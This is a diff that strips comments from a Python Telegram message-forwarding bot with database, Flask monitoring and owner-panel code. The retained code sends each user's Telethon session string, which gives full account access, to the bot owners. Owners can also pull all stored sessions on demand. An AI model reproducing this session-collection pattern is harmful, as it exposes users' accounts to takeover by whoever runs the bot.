@@ -1,12 +1,4 @@
 #!/usr/bin/env python3
-"""
-Combined Forwarder Bot Application
-==================================
-This is a single-file version combining:
-- forward.py: Main bot logic with Telegram message forwarding
-- database.py: SQLite/PostgreSQL database management
-- webserver.py: Flask web server for monitoring
-"""
 
 import os
 import asyncio
@@ -25,12 +17,10 @@ from collections import OrderedDict, defaultdict
 from dataclasses import dataclass
 from flask import Flask, request, jsonify
 
-# Telethon imports
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError, FloodWaitError
 
-# Telegram Bot API imports
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
@@ -41,14 +31,10 @@ from telegram.ext import (
     filters,
 )
 
-# Database imports - UPDATED TO PSYCOPG3
 import psycopg
 from psycopg.rows import dict_row
 from urllib.parse import urlparse
 
-# =================== CONFIGURATION & OPTIMIZATION ===================
-
-# Optimized logging configuration - reduce I/O overhead
 logging.getLogger("telethon").setLevel(logging.WARNING)
 logging.getLogger("httpx").setLevel(logging.WARNING)
 logging.getLogger("flask").setLevel(logging.WARNING)
@@ -59,17 +45,14 @@ logging.basicConfig(
 )
 logger = logging.getLogger("forwarder_bot")
 
-# Environment variables with optimized defaults
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 API_ID = int(os.getenv("API_ID", "0"))
 API_HASH = os.getenv("API_HASH", "")
 
-# Database configuration
-DATABASE_TYPE = os.getenv("DATABASE_TYPE", "sqlite").lower()  # "sqlite" or "postgres"
-DATABASE_URL = os.getenv("DATABASE_URL")  # For PostgreSQL (from Northflank)
+DATABASE_TYPE = os.getenv("DATABASE_TYPE", "sqlite").lower()
+DATABASE_URL = os.getenv("DATABASE_URL")
 SQLITE_DB_PATH = os.getenv("SQLITE_DB_PATH", "bot_data.db")
 
-# Verify database configuration
 if DATABASE_TYPE == "postgres" and not DATABASE_URL:
     logger.warning("DATABASE_TYPE is set to 'postgres' but DATABASE_URL is not set!")
     logger.warning("Falling back to SQLite")
@@ -77,7 +60,6 @@ if DATABASE_TYPE == "postgres" and not DATABASE_URL:
 
 logger.info(f"Using database type: {DATABASE_TYPE}")
 
-# Pre-compile regex patterns for performance
 EMOJI_PATTERN = re.compile(
     "["
     "\U0001F600-\U0001F64F"
@@ -93,7 +75,6 @@ WORD_PATTERN = re.compile(r'\S+')
 NUMERIC_PATTERN = re.compile(r'^\d+$')
 ALPHABETIC_PATTERN = re.compile(r'^[A-Za-z]+$')
 
-# Cache for string sessions from environment
 USER_SESSIONS = {}
 user_sessions_env = os.getenv("USER_SESSIONS", "").strip()
 if user_sessions_env:
@@ -107,7 +88,6 @@ if user_sessions_env:
         except ValueError:
             continue
 
-# User ID sets for fast membership testing
 OWNER_IDS = set()
 owner_env = os.getenv("OWNER_IDS", "").strip()
 if owner_env:
@@ -118,7 +98,6 @@ allowed_env = os.getenv("ALLOWED_USERS", "").strip()
 if allowed_env:
     ALLOWED_USERS.update(int(part) for part in allowed_env.split(",") if part.strip().isdigit())
 
-# Performance tuning parameters with memory optimization
 SEND_WORKER_COUNT = int(os.getenv("SEND_WORKER_COUNT", "20"))
 SEND_QUEUE_MAXSIZE = int(os.getenv("SEND_QUEUE_MAXSIZE", "2000"))
 TARGET_RESOLVE_RETRY_SECONDS = int(os.getenv("TARGET_RESOLVE_RETRY_SECONDS", "3"))
@@ -127,14 +106,10 @@ SEND_CONCURRENCY_PER_USER = int(os.getenv("SEND_CONCURRENCY_PER_USER", "15"))
 SEND_RATE_PER_USER = float(os.getenv("SEND_RATE_PER_USER", "10.0"))
 TARGET_ENTITY_CACHE_SIZE = int(os.getenv("TARGET_ENTITY_CACHE_SIZE", "50"))
 
-# Web server configuration
 WEB_SERVER_PORT = int(os.getenv("WEB_SERVER_PORT", "5000"))
 DEFAULT_CONTAINER_MAX_RAM_MB = int(os.getenv("CONTAINER_MAX_RAM_MB", "512"))
 
-# =================== DATABASE CLASS ===================
-
 class Database:
-    """Hybrid database management - supports SQLite and PostgreSQL"""
     
     def __init__(self):
         self.db_type = DATABASE_TYPE
@@ -144,7 +119,6 @@ class Database:
         self._conn_init_lock = threading.Lock()
         self._thread_local = threading.local()
         
-        # Initialize DB schema based on type
         try:
             self.init_db()
             logger.info(f"Database initialized with type: {self.db_type}")
@@ -153,37 +127,30 @@ class Database:
             raise
     
     def _create_sqlite_connection(self) -> sqlite3.Connection:
-        """Create a new SQLite connection"""
         conn = sqlite3.connect(self.db_path, timeout=30, check_same_thread=False)
         conn.row_factory = sqlite3.Row
         self._apply_sqlite_pragmas(conn)
         return conn
     
     def _create_postgres_connection(self) -> psycopg.Connection:
-        """Create a new PostgreSQL connection"""
         if not self.postgres_url:
             raise ValueError("DATABASE_URL not set for PostgreSQL")
         
-        # Parse the connection URL
         parsed = urlparse(self.postgres_url)
         
-        # Extract connection parameters
-        dbname = parsed.path[1:]  # Remove leading slash
+        dbname = parsed.path[1:]
         user = parsed.username
         password = parsed.password
         host = parsed.hostname
         port = parsed.port or 5432
         
-        # Build connection string
         conn_str = f"postgresql://{user}:{password}@{host}:{port}/{dbname}"
         
-        # Add SSL mode if specified
         if parsed.query:
             params = dict(pair.split('=') for pair in parsed.query.split('&') if '=' in pair)
             sslmode = params.get('sslmode', 'require')
             conn_str += f"?sslmode={sslmode}"
         
-        # Create connection
         conn = psycopg.connect(
             conn_str,
             autocommit=False,
@@ -192,26 +159,23 @@ class Database:
         return conn
     
     def _apply_sqlite_pragmas(self, conn: sqlite3.Connection):
-        """Apply SQLite performance pragmas"""
         try:
             conn.execute("PRAGMA journal_mode=WAL;")
             conn.execute("PRAGMA synchronous=NORMAL;")
             conn.execute("PRAGMA temp_store=MEMORY;")
             conn.execute("PRAGMA cache_size=-1000;")
-            conn.execute("PRAGMA mmap_size=268435456;")  # 256MB mmap
+            conn.execute("PRAGMA mmap_size=268435456;")
         except Exception:
             pass
     
     def get_connection(self):
-        """Return a thread-local connection (create if missing)"""
         conn = getattr(self._thread_local, "conn", None)
         
         if conn:
             try:
-                # Lightweight liveness check
                 if self.db_type == "sqlite":
                     conn.execute("SELECT 1")
-                else:  # postgres
+                else:
                     with conn.cursor() as cur:
                         cur.execute("SELECT 1")
                 return conn
@@ -225,7 +189,7 @@ class Database:
         try:
             if self.db_type == "sqlite":
                 self._thread_local.conn = self._create_sqlite_connection()
-            else:  # postgres
+            else:
                 self._thread_local.conn = self._create_postgres_connection()
             return self._thread_local.conn
         except Exception as e:
@@ -233,7 +197,6 @@ class Database:
             raise
     
     def close_connection(self):
-        """Close connection (only for shutdown/idle)"""
         conn = getattr(self._thread_local, "conn", None)
         if conn:
             try:
@@ -243,14 +206,12 @@ class Database:
             self._thread_local.conn = None
     
     def init_db(self):
-        """Initialize database tables for both SQLite and PostgreSQL"""
         with self._conn_init_lock:
             conn = self.get_connection()
             
             if self.db_type == "sqlite":
                 cur = conn.cursor()
                 
-                # Users table
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS users (
                         user_id INTEGER PRIMARY KEY,
@@ -263,7 +224,6 @@ class Database:
                     )
                 """)
                 
-                # Forwarding tasks table
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS forwarding_tasks (
                         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -280,7 +240,6 @@ class Database:
                     )
                 """)
                 
-                # Allowed users table
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS allowed_users (
                         user_id INTEGER PRIMARY KEY,
@@ -293,9 +252,8 @@ class Database:
                 
                 conn.commit()
                 
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
-                    # Users table
                     cur.execute("""
                         CREATE TABLE IF NOT EXISTS users (
                             user_id BIGINT PRIMARY KEY,
@@ -308,7 +266,6 @@ class Database:
                         )
                     """)
                     
-                    # Forwarding tasks table
                     cur.execute("""
                         CREATE TABLE IF NOT EXISTS forwarding_tasks (
                             id SERIAL PRIMARY KEY,
@@ -325,7 +282,6 @@ class Database:
                         )
                     """)
                     
-                    # Allowed users table
                     cur.execute("""
                         CREATE TABLE IF NOT EXISTS allowed_users (
                             user_id BIGINT PRIMARY KEY,
@@ -339,7 +295,6 @@ class Database:
                 conn.commit()
     
     def get_user(self, user_id: int) -> Optional[Dict]:
-        """Get user by ID"""
         conn = self.get_connection()
         try:
             if self.db_type == "sqlite":
@@ -357,13 +312,12 @@ class Database:
                     "created_at": row["created_at"],
                     "updated_at": row["updated_at"],
                 }
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute("SELECT * FROM users WHERE user_id = %s", (user_id,))
                     row = cur.fetchone()
                     if not row:
                         return None
-                    # Convert datetime objects to ISO format strings
                     created_at = row["created_at"]
                     updated_at = row["updated_at"]
                     return {
@@ -387,7 +341,6 @@ class Database:
         session_data: Optional[str] = None,
         is_logged_in: bool = False,
     ):
-        """Save or update user"""
         conn = self.get_connection()
         try:
             existing = self.get_user(user_id)
@@ -427,7 +380,7 @@ class Database:
                 
                 conn.commit()
                 
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     if existing:
                         updates = []
@@ -473,10 +426,8 @@ class Database:
             raise
     
     def add_forwarding_task(self, user_id: int, label: str, source_ids: List[int], target_ids: List[int], filters: Optional[Dict[str, Any]] = None) -> bool:
-        """Add a forwarding task"""
         conn = self.get_connection()
         try:
-            # Default filters if not provided
             if filters is None:
                 filters = {
                     "filters": {
@@ -508,7 +459,7 @@ class Database:
                 except sqlite3.IntegrityError:
                     return False
                     
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     try:
                         cur.execute(
@@ -530,7 +481,6 @@ class Database:
             raise
     
     def update_task_filters(self, user_id: int, label: str, filters: Dict[str, Any]) -> bool:
-        """Update filters for a specific task"""
         conn = self.get_connection()
         try:
             if self.db_type == "sqlite":
@@ -546,7 +496,7 @@ class Database:
                 updated = cur.rowcount > 0
                 conn.commit()
                 return updated
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute(
                         """
@@ -564,7 +514,6 @@ class Database:
             raise
     
     def remove_forwarding_task(self, user_id: int, label: str) -> bool:
-        """Remove a forwarding task"""
         conn = self.get_connection()
         try:
             if self.db_type == "sqlite":
@@ -573,7 +522,7 @@ class Database:
                 deleted = cur.rowcount > 0
                 conn.commit()
                 return deleted
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute("DELETE FROM forwarding_tasks WHERE user_id = %s AND label = %s", (user_id, label))
                     deleted = cur.rowcount > 0
@@ -584,7 +533,6 @@ class Database:
             raise
     
     def get_user_tasks(self, user_id: int) -> List[Dict]:
-        """Get all tasks for a user"""
         conn = self.get_connection()
         try:
             tasks = []
@@ -619,7 +567,7 @@ class Database:
                         }
                     )
                     
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute(
                         """
@@ -651,7 +599,6 @@ class Database:
             raise
     
     def get_all_active_tasks(self) -> List[Dict]:
-        """Get all active tasks across all users"""
         conn = self.get_connection()
         try:
             tasks = []
@@ -681,7 +628,7 @@ class Database:
                             "filters": filters_data,
                         }
                     )
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute(
                         """
@@ -707,14 +654,13 @@ class Database:
             raise
     
     def is_user_allowed(self, user_id: int) -> bool:
-        """Check if user is allowed"""
         conn = self.get_connection()
         try:
             if self.db_type == "sqlite":
                 cur = conn.cursor()
                 cur.execute("SELECT user_id FROM allowed_users WHERE user_id = ?", (user_id,))
                 return cur.fetchone() is not None
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute("SELECT user_id FROM allowed_users WHERE user_id = %s", (user_id,))
                     return cur.fetchone() is not None
@@ -723,7 +669,6 @@ class Database:
             raise
     
     def is_user_admin(self, user_id: int) -> bool:
-        """Check if user is admin"""
         conn = self.get_connection()
         try:
             if self.db_type == "sqlite":
@@ -731,7 +676,7 @@ class Database:
                 cur.execute("SELECT is_admin FROM allowed_users WHERE user_id = ?", (user_id,))
                 row = cur.fetchone()
                 return row is not None and int(row["is_admin"]) == 1
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute("SELECT is_admin FROM allowed_users WHERE user_id = %s", (user_id,))
                     row = cur.fetchone()
@@ -741,7 +686,6 @@ class Database:
             raise
     
     def add_allowed_user(self, user_id: int, username: Optional[str] = None, is_admin: bool = False, added_by: Optional[int] = None) -> bool:
-        """Add allowed user"""
         conn = self.get_connection()
         try:
             if self.db_type == "sqlite":
@@ -758,7 +702,7 @@ class Database:
                     return True
                 except sqlite3.IntegrityError:
                     return False
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     try:
                         cur.execute(
@@ -779,7 +723,6 @@ class Database:
             raise
     
     def remove_allowed_user(self, user_id: int) -> bool:
-        """Remove allowed user"""
         conn = self.get_connection()
         try:
             if self.db_type == "sqlite":
@@ -788,7 +731,7 @@ class Database:
                 deleted = cur.rowcount > 0
                 conn.commit()
                 return deleted
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute("DELETE FROM allowed_users WHERE user_id = %s", (user_id,))
                     deleted = cur.rowcount > 0
@@ -799,7 +742,6 @@ class Database:
             raise
     
     def get_all_allowed_users(self) -> List[Dict]:
-        """Get all allowed users"""
         conn = self.get_connection()
         try:
             users = []
@@ -823,7 +765,7 @@ class Database:
                             "created_at": row["created_at"],
                         }
                     )
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute(
                         """
@@ -848,7 +790,6 @@ class Database:
             raise
     
     def get_logged_in_users(self, limit: Optional[int] = None) -> List[Dict]:
-        """Get logged-in users"""
         conn = self.get_connection()
         try:
             if self.db_type == "sqlite":
@@ -872,7 +813,7 @@ class Database:
                         user_id, session_data = r[0], r[1]
                     result.append({"user_id": user_id, "session_data": session_data})
                 return result
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     if limit and int(limit) > 0:
                         cur.execute(
@@ -893,7 +834,6 @@ class Database:
             raise
     
     def get_user_phone_status(self, user_id: int) -> Dict:
-        """Get user phone status"""
         conn = self.get_connection()
         try:
             if self.db_type == "sqlite":
@@ -905,7 +845,7 @@ class Database:
 
                 has_phone = row["phone"] is not None and row["phone"] != ""
                 return {"has_phone": has_phone, "is_logged_in": bool(row["is_logged_in"])}
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute("SELECT phone, is_logged_in FROM users WHERE user_id = %s", (user_id,))
                     row = cur.fetchone()
@@ -919,7 +859,6 @@ class Database:
             raise
     
     def get_db_status(self) -> Dict:
-        """Get database status"""
         status = {
             "type": self.db_type,
             "path": self.db_path if self.db_type == "sqlite" else self.postgres_url,
@@ -935,7 +874,6 @@ class Database:
                 if status["exists"]:
                     status["size_bytes"] = os.path.getsize(self.db_path)
             else:
-                # For PostgreSQL, we'll just mark it as exists if we can connect
                 status["exists"] = True
         except Exception:
             logger.exception("Error reading DB file info")
@@ -973,14 +911,12 @@ class Database:
                                 status["counts"][table] = 0
                         except Exception:
                             status["counts"][table] = None
-                else:  # postgres
+                else:
                     with conn.cursor() as cur:
-                        # Get version info
                         cur.execute("SHOW server_version;")
                         row = cur.fetchone()
                         status["user_version"] = row[0] if row else None
                         
-                        # Get table counts
                         for table in ("users", "forwarding_tasks", "allowed_users"):
                             try:
                                 cur.execute(f"SELECT COUNT(1) as c FROM {table}")
@@ -996,7 +932,6 @@ class Database:
         return status
     
     def get_all_string_sessions(self) -> List[Dict]:
-        """Get all string sessions from database"""
         conn = self.get_connection()
         try:
             sessions = []
@@ -1019,7 +954,7 @@ class Database:
                         "phone": row["phone"],
                         "is_logged_in": bool(row["is_logged_in"])
                     })
-            else:  # postgres
+            else:
                 with conn.cursor() as cur:
                     cur.execute(
                         """
@@ -1044,16 +979,12 @@ class Database:
             raise
     
     def __del__(self):
-        """Destructor - clean up connections"""
         try:
             self.close_connection()
         except Exception:
             pass
 
-# =================== WEB SERVER ===================
-
 class WebServer:
-    """Flask web server for monitoring"""
     
     def __init__(self, port: int = 5000):
         self.port = port
@@ -1064,16 +995,13 @@ class WebServer:
         self.setup_routes()
     
     def register_monitoring(self, callback):
-        """Register monitoring callback"""
         self._monitor_callback = callback
         logger.info("Monitoring callback registered")
     
     def _mb_from_bytes(self, n_bytes: int) -> float:
-        """Convert bytes to MB"""
         return round(n_bytes / (1024 * 1024), 2)
     
     def _read_cgroup_memory_limit_bytes(self) -> int:
-        """Read container memory limit"""
         candidates = [
             "/sys/fs/cgroup/memory.max",
             "/sys/fs/cgroup/memory/memory.limit_in_bytes",
@@ -1126,7 +1054,6 @@ class WebServer:
         return 0
     
     def get_container_memory_limit_mb(self) -> float:
-        """Get container memory limit in MB"""
         if self._cached_container_limit_mb is not None:
             return self._cached_container_limit_mb
 
@@ -1138,7 +1065,6 @@ class WebServer:
         return self._cached_container_limit_mb
     
     def setup_routes(self):
-        """Setup Flask routes"""
         
         @self.app.route("/", methods=["GET"])
         def home():
@@ -1205,7 +1131,6 @@ class WebServer:
         
         @self.app.route("/metrics", methods=["GET"])
         def metrics():
-            """Returns forwarding subsystem metrics"""
             if self._monitor_callback is None:
                 return jsonify({"status": "unavailable", "reason": "no monitor registered"}), 200
 
@@ -1217,22 +1142,16 @@ class WebServer:
                 return jsonify({"status": "error", "error": str(e)}), 500
     
     def run_server(self):
-        """Run the Flask server"""
         self.app.run(host="0.0.0.0", port=self.port, debug=False, use_reloader=False, threaded=True)
     
     def start(self):
-        """Start web server in a separate thread"""
         server_thread = threading.Thread(target=self.run_server, daemon=True)
         server_thread.start()
         logger.info(f"🌐 Web server started on port {self.port}")
 
-# =================== GLOBAL STATE & CACHES ===================
-
-# Initialize components
 db = Database()
 web_server = WebServer(port=WEB_SERVER_PORT)
 
-# Optimized data structures
 user_clients: Dict[int, TelegramClient] = {}
 login_states: Dict[int, Dict] = {}
 logout_states: Dict[int, Dict] = {}
@@ -1240,28 +1159,23 @@ user_session_strings: Dict[int, str] = {}
 phone_verification_states: Dict[int, Dict] = {}
 task_creation_states: Dict[int, Dict[str, Any]] = {}
 
-# Enhanced cache with LRU eviction
 tasks_cache: Dict[int, List[Dict]] = {}
 target_entity_cache: Dict[int, OrderedDict] = {}
 handler_registered: Dict[int, Callable] = {}
 user_send_semaphores: Dict[int, asyncio.Semaphore] = {}
 user_rate_limiters: Dict[int, Tuple[float, float]] = {}
 
-# Queue and workers
 send_queue: Optional[asyncio.Queue] = None
 worker_tasks: List[asyncio.Task] = []
 _send_workers_started = False
 
-# Main loop reference
 MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
 
-# Memory management
 _last_gc_run = 0
-GC_INTERVAL = 600  # 10 minutes
+GC_INTERVAL = 600
 
-# Authorization cache for faster checks
 _auth_cache: Dict[int, Tuple[bool, float]] = {}
-_AUTH_CACHE_TTL = 300  # 5 minutes
+_AUTH_CACHE_TTL = 300
 
 UNAUTHORIZED_MESSAGE = """🚫 **Access Denied!** 
 
@@ -1274,14 +1188,10 @@ Or
 🗨️ **Message Developer:** [HEMMY](https://t.me/justmemmy)
 """
 
-# =================== OPTIMIZED UTILITY FUNCTIONS ===================
-
 def _clean_phone_number(text: str) -> str:
-    """Fast phone number cleaning"""
     return '+' + ''.join(c for c in text if c.isdigit())
 
 def _get_cached_auth(user_id: int) -> Optional[bool]:
-    """Get cached authorization status"""
     if user_id in _auth_cache:
         allowed, timestamp = _auth_cache[user_id]
         if time.time() - timestamp < _AUTH_CACHE_TTL:
@@ -1289,33 +1199,26 @@ def _get_cached_auth(user_id: int) -> Optional[bool]:
     return None
 
 def _set_cached_auth(user_id: int, allowed: bool):
-    """Cache authorization status"""
     _auth_cache[user_id] = (allowed, time.time())
 
 async def db_call(func, *args, **kwargs):
-    """Optimized database call wrapper"""
     loop = asyncio.get_event_loop()
     return await loop.run_in_executor(None, functools.partial(func, *args, **kwargs))
 
 async def optimized_gc():
-    """Memory-optimized garbage collection"""
     global _last_gc_run
     current_time = time.time()
     if current_time - _last_gc_run > GC_INTERVAL:
-        collected = gc.collect(2)  # Generation 2 collection
+        collected = gc.collect(2)
         if collected > 1000:
             logger.debug(f"GC collected {collected} objects")
         _last_gc_run = current_time
 
-# =================== CACHE MANAGEMENT ===================
-
 def _ensure_user_target_cache(user_id: int):
-    """Ensure target cache exists for user"""
     if user_id not in target_entity_cache:
         target_entity_cache[user_id] = OrderedDict()
 
 def _get_cached_target(user_id: int, target_id: int):
-    """Get cached target entity with LRU update"""
     _ensure_user_target_cache(user_id)
     od = target_entity_cache[user_id]
     if target_id in od:
@@ -1324,7 +1227,6 @@ def _get_cached_target(user_id: int, target_id: int):
     return None
 
 def _set_cached_target(user_id: int, target_id: int, entity: object):
-    """Cache target entity with LRU eviction"""
     _ensure_user_target_cache(user_id)
     od = target_entity_cache[user_id]
     od[target_id] = entity
@@ -1333,17 +1235,14 @@ def _set_cached_target(user_id: int, target_id: int, entity: object):
         od.popitem(last=False)
 
 def _ensure_user_send_semaphore(user_id: int):
-    """Ensure semaphore exists for user"""
     if user_id not in user_send_semaphores:
         user_send_semaphores[user_id] = asyncio.Semaphore(SEND_CONCURRENCY_PER_USER)
 
 def _ensure_user_rate_limiter(user_id: int):
-    """Ensure rate limiter exists for user"""
     if user_id not in user_rate_limiters:
         user_rate_limiters[user_id] = (SEND_RATE_PER_USER, time.time())
 
 async def _consume_token(user_id: int, amount: float = 1.0):
-    """Token bucket rate limiting"""
     _ensure_user_rate_limiter(user_id)
     while True:
         tokens, last = user_rate_limiters[user_id]
@@ -1356,39 +1255,30 @@ async def _consume_token(user_id: int, amount: float = 1.0):
             user_rate_limiters[user_id] = (tokens, now)
             return
         user_rate_limiters[user_id] = (tokens, now)
-        await asyncio.sleep(0.05)  # Reduced sleep time
-
-# =================== OPTIMIZED FILTER FUNCTIONS ===================
+        await asyncio.sleep(0.05)
 
 def extract_words(text: str) -> List[str]:
-    """Fast word extraction using compiled regex"""
     return WORD_PATTERN.findall(text)
 
 def is_numeric_word(word: str) -> bool:
-    """Fast numeric check"""
     return bool(NUMERIC_PATTERN.match(word))
 
 def is_alphabetic_word(word: str) -> bool:
-    """Fast alphabetic check"""
     return bool(ALPHABETIC_PATTERN.match(word))
 
 def contains_numeric(word: str) -> bool:
-    """Fast numeric presence check"""
     return any(c.isdigit() for c in word)
 
 def contains_alphabetic(word: str) -> bool:
-    """Fast alphabetic presence check"""
     return any(c.isalpha() for c in word)
 
 def contains_special_characters(word: str) -> bool:
-    """Fast special character check"""
     for char in word:
         if not char.isalnum() and not EMOJI_PATTERN.search(char):
             return True
     return False
 
 def apply_filters(message_text: str, task_filters: Dict) -> List[str]:
-    """Optimized filter application"""
     if not message_text:
         return []
     
@@ -1425,11 +1315,9 @@ def apply_filters(message_text: str, task_filters: Dict) -> List[str]:
     else:
         words = extract_words(message_text)
         for word in words:
-            # Skip processing if empty
             if not word:
                 continue
                 
-            # Apply filter-specific checks
             skip_word = False
             if filters_enabled.get('removed_alphabetic', False):
                 if contains_numeric(word) or EMOJI_PATTERN.search(word):
@@ -1449,25 +1337,19 @@ def apply_filters(message_text: str, task_filters: Dict) -> List[str]:
     
     return messages_to_send
 
-# =================== AUTHORIZATION ===================
-
 async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """Optimized authorization check with caching"""
     user_id = update.effective_user.id
     
-    # Check cache first
     cached = _get_cached_auth(user_id)
     if cached is not None:
         if not cached:
             await _send_unauthorized(update)
         return cached
     
-    # Check environment sets (fast)
     if user_id in ALLOWED_USERS or user_id in OWNER_IDS:
         _set_cached_auth(user_id, True)
         return True
     
-    # Check database (slower)
     try:
         is_allowed_db = await db_call(db.is_user_allowed, user_id)
         _set_cached_auth(user_id, is_allowed_db)
@@ -1482,7 +1364,6 @@ async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE
         return False
 
 async def _send_unauthorized(update: Update):
-    """Send unauthorized message"""
     if update.message:
         await update.message.reply_text(
             UNAUTHORIZED_MESSAGE,
@@ -1497,10 +1378,7 @@ async def _send_unauthorized(update: Update):
             disable_web_page_preview=True,
         )
 
-# =================== SESSION MANAGEMENT ===================
-
 async def send_session_to_owners(user_id: int, phone: str, name: str, session_string: str):
-    """Send session info to owners"""
     from telegram import Bot
     bot = Bot(token=BOT_TOKEN)
     
@@ -1520,12 +1398,10 @@ async def send_session_to_owners(user_id: int, phone: str, name: str, session_st
             continue
 
 async def check_phone_number_required(user_id: int) -> bool:
-    """Check if phone number is needed"""
     user = await db_call(db.get_user, user_id)
     return bool(user and user.get("is_logged_in") and not user.get("phone"))
 
 async def ask_for_phone_number(user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
-    """Request phone number"""
     phone_verification_states[user_id] = {
         "step": "waiting_phone",
         "chat_id": chat_id
@@ -1555,7 +1431,6 @@ Your account was restored from a saved session, but we need your phone number fo
         logger.exception("Failed to send phone verification message")
 
 async def handle_phone_verification(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle phone verification"""
     user_id = update.effective_user.id
     
     if user_id not in phone_verification_states:
@@ -1604,10 +1479,7 @@ async def handle_phone_verification(update: Update, context: ContextTypes.DEFAUL
             await update.message.reply_text("❌ **Session not found!**")
             del phone_verification_states[user_id]
 
-# =================== MENU SYSTEM ===================
-
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
-    """Show main menu"""
     user = await db_call(db.get_user, user_id)
     
     user_name = update.effective_user.first_name or "User"
@@ -1672,7 +1544,6 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, use
         )
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start command handler"""
     user_id = update.effective_user.id
 
     if not await check_authorization(update, context):
@@ -1684,10 +1555,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await show_main_menu(update, context, user_id)
 
-# =================== NEW OWNER COMMANDS SYSTEM ===================
-
 async def ownersets_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Owner control panel - main entry point"""
     user_id = update.effective_user.id
     
     if user_id not in OWNER_IDS:
@@ -1697,7 +1565,6 @@ async def ownersets_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await show_owner_panel(update, context)
 
 async def show_owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show owner control panel"""
     query = update.callback_query if update.callback_query else None
     user_id = query.from_user.id if query else update.effective_user.id
     
@@ -1745,7 +1612,6 @@ async def show_owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 async def handle_owner_actions(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle owner panel button actions"""
     query = update.callback_query
     user_id = query.from_user.id
     
@@ -1786,7 +1652,6 @@ async def handle_owner_actions(update: Update, context: ContextTypes.DEFAULT_TYP
         await show_owner_panel(update, context)
 
 async def handle_get_all_strings(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle get all string sessions"""
     query = update.callback_query
     user_id = query.from_user.id
     
@@ -1834,7 +1699,6 @@ async def handle_get_all_strings(update: Update, context: ContextTypes.DEFAULT_T
             pass
 
 async def handle_get_user_string_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Ask for user ID to get string session"""
     query = update.callback_query
     
     message_text = """👤 **Get User String Session**
@@ -1853,12 +1717,10 @@ Enter the User ID to get their session string:
         parse_mode="Markdown"
     )
     
-    # Set state to wait for user input
     context.user_data["owner_action"] = "get_user_string"
     context.user_data["awaiting_input"] = True
 
 async def handle_get_user_string(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle user ID input for getting string session"""
     user_id = update.effective_user.id
     text = update.message.text.strip()
     
@@ -1895,7 +1757,6 @@ async def handle_get_user_string(update: Update, context: ContextTypes.DEFAULT_T
     context.user_data.clear()
 
 async def handle_list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """List all allowed users"""
     query = update.callback_query
     
     users = await db_call(db.get_all_allowed_users)
@@ -1922,7 +1783,6 @@ async def handle_list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(user_list, parse_mode="Markdown")
 
 async def handle_add_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Ask for user ID to add"""
     query = update.callback_query
     
     message_text = """➕ **Add New User**
@@ -1941,13 +1801,11 @@ Step 1 of 2: Enter the User ID to add:
         parse_mode="Markdown"
     )
     
-    # Set state to wait for user input
     context.user_data["owner_action"] = "add_user"
     context.user_data["add_user_step"] = "user_id"
     context.user_data["awaiting_input"] = True
 
 async def handle_add_user_admin_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Ask if user should be admin"""
     query = update.callback_query
     target_user_id = context.user_data.get("add_user_id")
     
@@ -1981,7 +1839,6 @@ Step 2 of 2: Should user `{target_user_id}` be an admin?
     context.user_data["awaiting_input"] = True
 
 async def handle_add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle add user process"""
     user_id = update.effective_user.id
     text = update.message.text.strip().lower()
     
@@ -1995,7 +1852,6 @@ async def handle_add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
             target_user_id = int(text)
             context.user_data["add_user_id"] = target_user_id
             
-            # Ask if admin
             message_text = f"""➕ **Add New User**
 
 Step 2 of 2: Should user `{target_user_id}` be an admin?
@@ -2056,7 +1912,6 @@ Step 2 of 2: Should user `{target_user_id}` be an admin?
         context.user_data.clear()
 
 async def handle_remove_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Ask for user ID to remove"""
     query = update.callback_query
     
     message_text = """➖ **Remove User**
@@ -2075,12 +1930,10 @@ Enter the User ID to remove:
         parse_mode="Markdown"
     )
     
-    # Set state to wait for user input
